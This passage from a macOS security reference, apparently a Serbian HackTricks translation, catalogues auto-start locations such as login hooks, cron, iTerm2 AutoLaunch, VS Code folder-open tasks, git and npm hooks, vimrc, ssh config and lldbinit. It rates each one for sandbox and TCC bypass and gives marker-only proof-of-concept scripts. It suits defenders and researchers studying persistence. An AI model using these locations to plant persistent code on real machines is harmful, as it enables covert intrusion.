Ove funkcije su zastarele, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Ova postavka se čuva u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Da biste ga obrisali:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Unos za root korisnika čuva se u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Uslovni zaobilažaj Sandbox-a

> [!TIP]
> Ovde možete pronaći lokacije za pokretanje korisne za **zaobilaženje Sandbox-a**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** i **računati na ne baš uobičajene uslove**, kao što su instalirani određeni **programi, „neuobičajene“ radnje korisnika** ili okruženja.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Korisno za zaobilaženje Sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Međutim, morate moći da izvršite binarnu datoteku `crontab`
  - Ili morate biti root
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/usr/lib/cron/tabs/`**
  - Za direktan pristup upisivanju potrebna su root ovlašćenja. Root nije potreban ako možete da izvršite `crontab <file>`
  - **Okidač**: Raspored u instaliranom crontab-u. `at` i `periodic` su zasebni mehanizmi opisani ispod.

#### Opis i eksploatacija

Izlistajte cron zadatke **trenutnog korisnika** pomoću:

```bash
crontab -l
```

launchd plist sistemskog cron demona ima stavku `QueueDirectories` za `/usr/lib/cron/tabs`; tu se čuvaju instalirani korisnički crontab fajlovi. Za pregled crontab fajlova drugih korisnika potreban je root pristup:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

U nalogu namenjenom za jednokratnu upotrebu, cron stavka korisnika koja sadrži samo marker može se dodati pomoću `crontab`-a i ukloniti nakon što je posmatrate. Pokretanje komande `crontab <file>` **zamenjuje ceo postojeći crontab naloga**, zato ga sačuvajte i vratite ako nalog nije namenjen za jednokratnu upotrebu:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 je ranije imao dodeljene TCC dozvole

#### Lokacije

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Okidač**: Pokrenite iTerm2 dok se u toj fascikli nalazi odgovarajuća Python API skripta
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Okidač**: Pokrenite iTerm2; AppleScript startup hook je zasebno dokumentovan
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Okidač**: Kreirajte sesiju koristeći profil čija komanda ili početni tekst poziva payload

#### Opis i eksploatacija

[Aktuelni vodič za iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) opisuje automatsko pokretanje **Python** skripti u `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Ne potvrđuje da se proizvoljna izvršna `.sh` datoteka u toj fascikli pokreće. Na nalogu namenjenom za jednokratnu upotrebu sačuvajte ovo kao `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Aktuelni vodič za AppleScript u iTerm2](https://iterm2.com/documentation-scripting.html) zasebno dokumentuje `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, uz rezervnu putanju `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` za slučaj da moderna fascikla ne postoji. AppleScript koji sadrži samo oznaku izgleda ovako:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Ovi primeri skripti provereni su u dokumentaciji za iTerm2, ali nisu pokrenuti u aktivnoj desktop sesiji. Nakon testiranja na privremenom korisničkom nalogu, uklonite testnu skriptu i `/tmp/ht-iterm-autolaunch-marker` ili `/tmp/iterm2-autolaunchscpt`, u zavisnosti od slučaja.

Podešavanja iTerm2-a u **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu da navedu komandu profila ili početni tekst. Potonji se unosi u sesiju; izvršavanje zavisi od toga da li ga shell tumači. [Dokumentacija iTerm2-a o profilima](https://iterm2.com/documentation-preferences-profiles-general.html) opisuje komandu koja se pokreće kada se kreira nova sesija sa tim profilom.

Ovo podešavanje može da se konfiguriše u podešavanjima iTerm2-a:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komanda se odražava u podešavanjima:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Za bezbednu procenu pregledajte izabrani profil u podešavanjima iTerm2 ili pročitajte kopiju njegove datoteke sa podešavanjima. Promena stavke `Initial Text` u aktivnom profilu uticala bi na korisničke sesije, zato na Mac računaru za istraživanje nisu menjana nikakva podešavanja.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Korisno za bypass sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali xbar mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Accessibility

#### Lokacija

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Okidač**: Kada se xbar pokrene

#### Opis

Ako je instaliran popularni program [**xbar**](https://github.com/matryer/xbar), moguće je napisati shell skriptu u direktorijumu **`~/Library/Application\ Support/xbar/plugins/`** koja će se izvršiti kada se xbar pokrene:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali Hammerspoon mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Traži dozvole za Accessibility

#### Lokacija

- **`~/.hammerspoon/init.lua`**
  - **Okidač**: Kada se Hammerspoon pokrene

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA scripting language**. Posebno, podržava integraciju kompletnog AppleScript koda i izvršavanje shell skripti, što značajno proširuje njegove mogućnosti skriptovanja.<sup>[[13]](#references)</sup>

Aplikacija traži jednu datoteku, `~/.hammerspoon/init.lua`, a kada se pokrene, skripta se izvršava.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali BetterTouchTool mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Automation-Shortcuts i Accessibility

#### Lokacija

- Datoteka skripte na koju se **već upućuje** iz omogućenog BetterTouchTool preseta ili konfiguracija tog preseta u `~/Library/Application Support/BetterTouchTool/`. Tačna putanja skripte zavisi od podešavanja preseta.

[BetterTouchTool-ova referenca za akcije](https://docs.folivora.ai/docs/actions/action-definitions/) opisuje akcije za shell skripte i pozadinske komande. Podešeni događaj sa tastature, miša, dodira, vidžeta ili drugi događaj mora da nastupi dok je odgovarajući preset aktivan; [vodič za okidače](https://docs.folivora.ai/docs/configuration/new-trigger/) prikazuje ovu vezu. Nasumična datoteka u direktorijumu application-support nije okidač. Već podešena akcija koja učitava eksternu skriptu sa mogućnošću pisanja predstavlja užu metu za write-to-execution. Kod se izvršava pod nalogom korisnika BetterTouchTool-a, uz stvarne macOS dozvole tog naloga. BetterTouchTool nije bio prisutan u `/Applications` na istraživačkom Mac-u, pa nijedan preset nije lokalno izmenjen niti pokrenut.

### Alfred

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali Alfred mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Automation, Accessibility, pa čak i Full-Disk access

#### Lokacija

- Skripta ili datoteka na koju se **već upućuje** iz instaliranog Alfred workflow-a ili taj workflow unutar korisnikovog podešenog direktorijuma `Alfred.alfredpreferences`. Direktorijum sa podešavanjima može biti sinhronizovan i nema jednu univerzalnu, fiksnu putanju.

[Alfred-ov vodič za workflow-e](https://www.alfredapp.com/help/workflows/) opisuje preduslov Powerpack i instalaciju putem korisničkog interfejsa. Okidač hotkey, keyword ili drugi podešeni okidač instaliranog workflow-a mora da se aktivira; [Alfred-ov primer hotkey-a](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) prikazuje akciju skripte. [Alfred-ova referenca za okruženje](https://www.alfredapp.com/help/workflows/script-environment-variables/) izlaže izabranu putanju podešavanja kao `alfred_preferences`. Ubacivanje neregistrovane datoteke workflow-a u proizvoljan direktorijum ne dokazuje da će ona biti instalirana ili pokrenuta. Kod se izvršava kao prijavljeni korisnik Alfred-a, sa stvarnim macOS dozvolama tog naloga. Alfred nije bio prisutan u `/Applications` na istraživačkom Mac-u, pa je ovaj put procenjen samo na osnovu dokumentacije.

### Raycast Script Commands i osvežavanje ekstenzija

- **Ciljna lokacija za upis:** Izvršna skripta u direktorijumu koji je **već dodat** u Raycast Settings → Script Commands. Raycast ne skenira proizvoljan, novokreirani direktorijum. [Raycast-ov vodič za Script Commands](https://manual.raycast.com/script-commands) opisuje registraciju direktorijuma.
- **Okidač i identitet:** Korisnik pokreće indeksiranu komandu, podešeni hotkey ili fallback je pokreće, ili Raycast osvežava `inline` skriptu prema njenom podešenom `@raycast.refreshTime`. Skripta se izvršava kao prijavljeni korisnik Raycast-a, preko njegovog interpretera. [Referenca za upstream metapodatke](https://github.com/raycast/script-commands#metadata) ograničava automatsko osvežavanje na inline komande, a [Raycast-ov manifest ekstenzija](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) zasebno podržava `interval` za instalirane `no-view` ili `menu-bar` komande ekstenzija. Samo dodavanje obične komande skripte ne zakazuje njeno pokretanje.

Za jednokratni nalog sa registrovanim direktorijumom skripti, inline skripta koja upisuje samo oznaku izgleda ovako:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Sačuvajte ga u registrovanom direktorijumu, omogućite njegovo izvršavanje i dozvolite Raycast-u da se osveži. Zatim uklonite tu datoteku i `/tmp/ht-raycast-refresh-marker`. Raycast nije pronađen pod uobičajenim nazivom u `/Applications` na istraživačkom Mac-u, tako da je ovo potkrepljeno dokumentacijom i nije lokalno pokrenuto. Za pristupačnost, automatizaciju i pristup datotekama i dalje mogu da se pojave macOS upiti za dozvole.

### Automatski zadaci za radni prostor u Visual Studio Code-u

- **Ciljna datoteka za upis:** `.vscode/tasks.json` unutar radnog prostora koji će korisnik otvoriti.
- **Okidač:** Otvaranje tog radnog prostora u VS Code-u, ali samo kada je fascikla pouzdana **i** kada su dozvoljeni automatski zadaci. Nepouzdan radni prostor nikada ne pokreće automatske zadatke; podrazumevana postavka traži od korisnika potvrdu pre prvog automatskog pokretanja. [VS Code dokumentacija o zadacima](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) i [dokumentacija o pouzdanosti radnog prostora](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) opisuju oba uslova.
- **Identitet izvršavanja:** Nalog korisnika VS Code-a, preko konfigurisanog procesa zadatka. Ovo je izvršavanje specifično za aplikaciju, a ne postojanost pri prijavljivanju.

U **novom, privremenom radnom prostoru** smestite ovaj zadatak koji služi samo za postavljanje oznake u `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nakon otvaranja pouzdanog workspace-a i dozvole za automatske zadatke, proverite da li postoji `.autostart-task-ran`. Uklonite unos zadatka i marker radi čišćenja. **Ovo je provereno u odnosu na Microsoftovu dokumentaciju i instalirani paket VS Code 1.139.1; nije pokrenuto u aktivnoj desktop sesiji.**

### Chrome native messaging hosts

- **Ciljna putanja za upis:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` za trenutnog korisnika ili `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` za sve korisnike (potreban je administratorski pristup za upis). Chromium i Chrome for Testing koriste različite direktorijume; pogledajte [aktuelnu tabelu putanja za Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Okidač:** Instalirano Chrome proširenje sa dozvolom `nativeMessaging` poziva `chrome.runtime.connectNative()` ili `chrome.runtime.sendNativeMessage()` koristeći tačan naziv hosta iz manifesta. Chrome zatim pokreće izvršnu datoteku hosta. Samo otvaranje Chrome-a ne izvršava proizvoljan novi native host; kreiranje manifesta bez proširenja koje ga poziva ne radi ništa. [Chrome-ov vodič za native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) opisuje ovu razmenu.
- **Identitet izvršavanja:** Nalog Chrome korisnika. Manifest mora da navede apsolutnu putanju do izvršne datoteke i izričito da dozvoli origin proširenja koje ga poziva.

U privremenom browser nalogu sa testnim proširenjem, sledeći par datoteka prikazuje vezu između upisa i izvršavanja. Naziv datoteke manifesta mora da odgovara vrednosti `name`, a `TEST_EXTENSION_ID` mora da se zameni stvarnim ID-jem tog proširenja:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Sačuvajte ovaj JSON kao `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Izvršna datoteka koja služi samo kao marker, navedena u polju `path` manifesta, može da sadrži:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nakon što testno proširenje pozove `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` iz svog service worker-a ili stranice proširenja, marker potvrđuje da je host pokrenut. Ovaj minimalni host ne implementira Chrome-ov protokol odgovora sa prefiksom dužine, pa proširenje može prijaviti grešku u razmeni poruka nakon što se marker upiše. Uklonite testni manifest, host i marker radi čišćenja. Na macOS 26.5.2, Chrome aplikacija i oba direktorijuma manifesta bili su prisutni; **aktivni Chrome profil nije menjan niti korišćen**.

### Komande za događaje tastera u Karabiner-Elements

- **Cilj upisa:** `~/.config/karabiner/karabiner.json` u nalogu u kom je Karabiner-Elements instaliran i pokrenut. [Karabiner-ov vodič za lokaciju datoteke](https://karabiner-elements.pqrs.org/docs/json/location/) navodi da aplikacija nadgleda ovu datoteku i ponovo je učitava nakon upisa. JSON datoteke u `assets/complex_modifications` mogu samo da se uvezu kao unapred podešena pravila; sam upis datoteke na tu lokaciju ne aktivira pravilo.
- **Okidač:** Konfigurisani događaj tastera nakon aktiviranja pravila. Referenca za [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) opisuje izvršavanje komandi. Ovo nije izvršavanje koda pri prijavi niti pri svakom upisu datoteke.
- **Identitet izvršavanja:** Prijavljeni korisnik koji pokreće Karabiner-ov korisnički proces. Dozvole same aplikacije i sav TCC pristup zavise od aplikacije i verzije.

Za jednokratni testni nalog dodajte ovaj objekat pravila u niz `complex_modifications.rules` izabranog profila u `karabiner.json`, a ostatak profila ostavite neizmenjen. Pritisnite F18 da biste napravili bezopasan marker, a zatim uklonite ovo pravilo i marker. Izborom tastera F18 izbegava se zamena uobičajenog tastera za kucanje:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements nije bio instaliran u direktorijumu `/Applications` na testnoj mašini sa macOS 26.5.2, tako da je ovo PoC zasnovan na dokumentaciji, a ne rezultat lokalnog izvršavanja.

### Git hooks u lokalnom repozitorijumu

- **Cilj upisa:** Izvršna hook skripta kao što je `<repo>/.git/hooks/post-checkout`. Ako je `core.hooksPath` već podešen, umesto toga koristite taj konfigurisani direktorijum. Hook koji je commit-ovan kao obična praćena izvorna datoteka ne instalira se automatski u klon.
- **Okidač:** Odgovarajuća Git operacija. Na primer, `post-checkout` se pokreće nakon `git checkout` ili `git switch`, a može da se pokrene i nakon kloniranja ili kreiranja worktree-a. [Git-ova referenca za hooks](https://git-scm.com/docs/githooks) navodi događaje i zahtev za izvršnim bitom; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) menja direktorijum u kom se traže hooks.
- **Identitet izvršavanja:** Nalog koji pokreće Git. Hook može da se izvrši samo ako akter ima dozvolu za pisanje u efektivni direktorijum hooks za repozitorijum i ako korisnik kasnije obavi odgovarajuću Git operaciju.

Ovaj PoC koji samo kreira marker pravi potpuno privremeni repozitorijum, instalira jedan hook i prebacuje se na drugu granu. Uspešno je izvršen pomoću Apple Git 2.50.1 na macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle skripte u projektu

- **Cilj za upisivanje:** Mapa `scripts` u datoteci `package.json` projekta u koji je moguće upisivati ili u paketu instalirane zavisnosti čiju će lifecycle skriptu korisnik pokrenuti. Ovo je kuka u razvojnom toku rada, a ne izvršavanje pri otvaranju direktorijuma.
- **Okidač i identitet:** Naknadni `npm install` ili `npm ci`, kada su lifecycle skripte dozvoljene, pokreće `preinstall`, `install` i `postinstall` kao korisnik koji pokreće npm. Obična komanda `npm run <name>` takođe pokreće odgovarajuće skripte `pre<name>` i `post<name>`. [npm-ov referentni vodič za lifecycle](https://docs.npmjs.com/cli/v11/using-npm/scripts) navodi događaje; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) može da spreči pokretanje install lifecycle skripti. Podešavanja verzije i pravila mogu promeniti šta je dozvoljeno, zato proverite ciljnu npm verziju.

Ovaj PoC koji samo postavlja oznaku pokrenut je pomoću lokalnog npm-a u privremenom, praznom direktorijumu. Ne preuzima zavisnosti niti menja korisnikov projekat:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Ovo se razlikuje od datoteka za pokretanje Python interpreter-a: npm mora da izvrši odgovarajuću instalaciju ili radnju pokretanja, dok Python `site` kod može da se učita pri običnom pozivanju interpreter-a. Generički ciljevi `Makefile` i definicije zadataka za izgradnju takođe zahtevaju da korisnik ili već konfigurisan alat pozove taj cilj; oni nisu zasebne putanje za automatsko pokretanje operativnog sistema.

### Konfiguracija pokretanja Vim-a

- **Ciljna datoteka za upis:** `~/.vimrc` za korisnika koji će pokrenuti Vim (ili druga datoteka za pokretanje koju odabere redosled inicijalizacije Vim-a). [Vim-ova referenca za pokretanje](https://vimhelp.org/starting.txt.html) dokumentuje datoteku i zamene `VIMINIT`/`EXINIT`.
- **Okidač:** Naredno uobičajeno pokretanje Vim-a koje učitava ovu konfiguraciju. Vim-ova opcija `-u NONE` zaobilazi korisnički vimrc. Ovo je izvršavanje specifično za editor, a ne okidač za prijavljivanje u operativni sistem.
- **Identitet izvršavanja:** Nalog korisnika Vim-a.

Sledeći izolovani PoC pokrenut je u macOS-ovom `/usr/bin/vim`; ne upisuje stvarne Vim postavke niti otvorene dokumente:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ima zasebnu putanju za korisničku konfiguraciju, `$XDG_CONFIG_HOME/nvim/init.lua` ili `init.vim`, a učitava i skripte iz svojih `plugin/` runtime direktorijuma, u skladu sa [startup dokumentacijom](https://neovim.io/doc/user/starting/). Neovim nije bio instaliran na test mašini sa macOS 26.5.2, pa ova varijanta tamo nije pokrenuta.

### Komande za konfiguraciju SSH klijenta

- **Ciljna lokacija za upis:** `~/.ssh/config` ili druga datoteka koju ona već uključuje. Ovo je konfiguraciona datoteka **klijenta**; odvojena je od serverske `~/.ssh/rc`, opisane ispod.
- **Okidač:** Odgovarajući poziv `ssh`. `Match exec` pokreće lokalnu komandu dok klijent obrađuje konfiguraciju, čak i pri pozivu `ssh -G`, koji ispisuje konfiguraciju bez povezivanja. `ProxyCommand` se pokreće kada klijent uspostavlja odgovarajuću vezu. `LocalCommand` se pokreće tek nakon uspešnog povezivanja i zahteva `PermitLocalCommand yes` (podrazumevana vrednost je `no`). Ovi mehanizmi se razlikuju po vremenu pokretanja i preduslovima; samo upisivanje ne pokreće njihovo izvršavanje. Pogledajte zvaničnu dokumentaciju za [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Identitet pri izvršavanju:** Lokalni korisnik koji pokreće `ssh`. Potrebni su odgovarajući host, primenljiva konfiguraciona datoteka i eventualno neophodna veza. `ssh -F` može da izabere drugu konfiguracionu datoteku.

Ovaj PoC koji postavlja samo marker pokrenut je uz Apple-ov SSH klijent na macOS 26.5.2. `-G` testira `Match exec` bez uspostavljanja mrežne veze i bez čitanja stvarne SSH konfiguracije korisnika:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Datoteke za inicijalizaciju debagera

- **Cilj upisa:** `~/.lldbinit` ili datoteka specifična za aplikaciju sa višim prioritetom, kao što je `~/.lldbinit-lldb`. LLDB čita jednu datoteku pri pokretanju debagera. `.lldbinit` iz trenutnog direktorijuma se podrazumevano **ne izvršava**; korisnik mora da omogući `target.load-cwd-lldbinit` ili prosledi `--local-lldbinit`. Pogledajte [LLDB manual](https://lldb.llvm.org/man/lldb.html).
- **Okidač i identitet:** Korisnik pokreće LLDB bez `--no-lldbinit`; komande se izvršavaju kao taj korisnik. Samo otvaranje projekta ne znači da se izvršava njegov `.lldbinit`.

Sledeći test koji koristi samo marker izvršen je u LLDB-u na macOS 26.5.2, sa izolovanim home direktorijumom i radnim direktorijumom:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) navodi `$HOME/Library/Preferences/gdb/gdbinit`, a zatim `~/.gdbinit` na macOS-u. `.gdbinit` u trenutnom direktorijumu podleže [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), a `-nx`/`-nh` isključuju inicijalizacione datoteke. GDB nije bio instaliran na testnom Mac-u, pa ova varijanta nije lokalno testirana.

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali ssh mora biti omogućen i korišćen
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - SSH upotreba može imati FDA pristup

#### Lokacija

- **`~/.ssh/rc`**
  - **Okidač**: Prijava putem ssh-a
- **`/etc/ssh/sshrc`**
  - Potreban je root pristup
  - **Okidač**: Prijava putem ssh-a

> [!CAUTION]
> Za uključivanje ssh-a potreban je Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i eksploatacija

Podrazumevano, osim ako je u `/etc/ssh/sshd_config` navedeno `PermitUserRC no`, kada se korisnik **prijavi putem SSH-a**, izvršavaju se skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Stavke za prijavu**

Opis: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate da pokrenete `osascript` sa argumentima
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **Registrovana pomoćna aplikacija za prijavu:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (uobičajena lokacija u paketu).
  - **Okidač:** Registracija može odmah da pokrene pomoćnu aplikaciju; ona se zatim pokreće pri narednim prijavama korisnika, uz odobrenje.
- **Registrovani agent/daemon u paketu:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` ili `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Okidač:** Odobreni agent može da se pokrene pri registraciji i pri narednim prijavama; odobreni daemon se pokreće pri podizanju sistema. Za daemon je potrebno odobrenje administratora.

#### Opis

U **System Settings → General → Login Items & Extensions** korisnici mogu da pregledaju stavke za prijavu i stavke u pozadini. macOS 13 i novije verzije omogućavaju korišćenje [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) za registraciju stavki za prijavu, launch agenata i launch daemona koji su u paketu. Ponašanje metode [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) razlikuje se u zavisnosti od tipa i stanja odobrenja. **Upisivanje pomoćne aplikacije u paket aplikacije nije dovoljno da bi se registrovala nova stavka za prijavu.** Obrnuto, ako je izvršna datoteka već registrovane pomoćne aplikacije upisiva, njena izmena može da utiče na sledeće pokretanje bez nove registracije; prvo proverite stvarnu putanju i provere potpisivanja koda.

Sledeći način je samo za čitanje i služi za pronalaženje pomoćnih aplikacija u paketima na Macu; njime se nijedna od njih ne registruje niti pokreće:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Za objedinjeni launch plist, razrešite `BundleProgram` **u odnosu na koren app bundle-a** (na primer `Contents/MacOS/Helper`), kao što navode [Apple-ove smernice za migraciju Service Management-a](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Inventar direktorijuma `/Applications` samo za čitanje na istraživačkom Mac-u pronašao je 14 unosa objedinjenih pomoćnih programa i pet deklaracija `BundleProgram`; svih pet ciljnih putanja je razrešeno, a dve su prošle proveru mogućnosti upisivanja od strane korisnika. Ta provera **ne utvrđuje** da li je bilo koji od ta dva pomoćna programa registrovan, omogućen, izvršiv nakon validacije potpisa ili dostupan sandbox-u. `sfltool dumpbtm` je na ovom Mac-u izlistao 150 imenovanih zapisa; to je pomoćno sredstvo za inspekciju, a ne test kojim se utvrđuje da li je svaki zapis aktivan.

